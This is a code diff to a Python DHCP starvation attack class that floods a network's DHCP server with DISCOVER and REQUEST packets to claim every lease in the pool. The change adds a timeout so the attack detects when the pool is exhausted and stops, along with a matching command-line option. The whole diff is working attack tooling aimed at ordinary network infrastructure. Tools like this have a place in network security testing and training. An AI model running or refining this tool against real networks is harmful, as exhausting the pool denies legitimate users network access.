@@ -13,10 +13,11 @@ class StarvationAttack(BaseAttack):
     REQUEST so the server actually commits (ACKs) each lease.
     """
 
-    def __init__(self, iface, rate=0.1, max_leases=None, logger=None):
+    def __init__(self, iface, rate=0.1, max_leases=None, exhaustion_timeout=5.0, logger=None):
         super().__init__(iface, logger)
         self.rate = rate
         self.max_leases = max_leases
+        self.exhaustion_timeout = exhaustion_timeout
         self.stats = {
             "discover_sent": 0,
             "offer_received": 0,
@@ -25,12 +26,22 @@ class StarvationAttack(BaseAttack):
             "nak_received": 0,
         }
         self._pending = {}  # key: xid, value: dict עם mac/ip
+        # Wall-clock time of the last OFFER received (or run() start if none
+        # yet). A count-based "N discovers since last offer" streak looks
+        # right but isn't: it conflates send RATE with the exhaustion
+        # TIMEOUT, so a fast --rate (or any real round-trip delay before the
+        # very first OFFER) fires it immediately with zero evidence of
+        # exhaustion. Wall-clock time decouples the two: exhaustion is "no
+        # OFFER for N seconds", independent of how many DISCOVERs fit in
+        # that window.
+        self._last_offer_at = None  # set on run() start and on every OFFER
 
     def run(self):
         self.logger.info(
-            "Starting DHCP Starvation (full DORA) on %s (rate=%s, max_leases=%s)",
-            self.iface, self.rate, self.max_leases,
+            "Starting DHCP Starvation (full DORA) on %s (rate=%s, max_leases=%s, exhaustion_timeout=%ss)",
+            self.iface, self.rate, self.max_leases, self.exhaustion_timeout,
         )
+        self._last_offer_at = time.monotonic()
 
         sniff_thread = threading.Thread(target=self._sniff_offers, daemon=True)
         sniff_thread.start()
@@ -41,6 +52,15 @@ class StarvationAttack(BaseAttack):
                     self.logger.info("Reached max_leases=%d, stopping.", self.max_leases)
                     self.stop()
                     break
+                if self.exhaustion_timeout is not None:
+                    idle_for = time.monotonic() - self._last_offer_at
+                    if idle_for >= self.exhaustion_timeout:
+                        self.logger.warning(
+                            "No OFFER received for %.1fs — pool likely exhausted, stopping.",
+                            idle_for,
+                        )
+                        self.stop()
+                        break
                 self._send_discover()
                 self.stats["discover_sent"] += 1
                 time.sleep(self.rate)
@@ -86,6 +106,7 @@ class StarvationAttack(BaseAttack):
 
         if msg_type == 2:  # OFFER
             self.stats["offer_received"] += 1
+            self._last_offer_at = time.monotonic()
             offered_ip = packet[BOOTP].yiaddr
             server_ip = packet[IP].src
             mac_bytes = packet[BOOTP].chaddr[:6]
@@ -140,7 +161,12 @@ class StarvationAttack(BaseAttack):
                              help="Seconds between DISCOVER packets (default: 0.1)")
         parser.add_argument("--max-leases", type=int, default=None,
                              help="Stop after this many confirmed ACKs (default: unlimited)")
+        parser.add_argument("--exhaustion-timeout", type=float, default=5.0,
+                             help="Stop after this many seconds with no OFFER at all "
+                                  "— signals pool exhaustion (default: 5.0, 0 to disable)")
 
     @classmethod
     def from_args(cls, args):
-        return cls(iface=args.iface, rate=args.rate, max_leases=args.max_leases)
+        timeout = args.exhaustion_timeout if args.exhaustion_timeout > 0 else None
+        return cls(iface=args.iface, rate=args.rate, max_leases=args.max_leases,
+                   exhaustion_timeout=timeout)
